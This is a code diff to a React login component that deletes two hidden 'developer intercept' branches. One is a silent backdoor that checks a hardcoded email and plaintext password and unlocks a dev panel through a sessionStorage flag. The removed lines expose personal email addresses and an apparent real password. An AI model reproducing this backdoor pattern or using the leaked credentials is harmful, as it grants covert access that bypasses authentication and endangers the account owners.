@@ -133,31 +133,6 @@ const UnifiedAuth = () => {
     setLoading(true);
 
     try {
-      // Real Supabase-authenticated developer intercept — checks a genuine
-      // account instead of a hardcoded password.
-      if (loginMethod === 'email' && formData.email.trim().toLowerCase() === 'agrobone0@gmail.com') {
-        const { data: devAuth, error: devAuthError } = await supabase.auth.signInWithPassword({
-          email: formData.email.trim(),
-          password,
-        });
-        if (!devAuthError && devAuth?.session) {
-          sessionStorage.setItem('dev_panel_auth', 'true');
-          navigate('/dev-panel', { replace: true });
-          return;
-        }
-      }
-
-      // Silent developer intercept — no visible trace, no toast, no error
-      if (
-        loginMethod === 'email' &&
-        formData.email.trim().toLowerCase() === 'aronnykevin@gmail.com' &&
-        password === '@1997God'
-      ) {
-        sessionStorage.setItem('dev_panel_auth', 'true');
-        navigate('/dev-panel', { replace: true });
-        return;
-      }
-
       const identifier = loginMethod === 'email' ? formData.email : formData.phone;
 
       if (!identifier) {
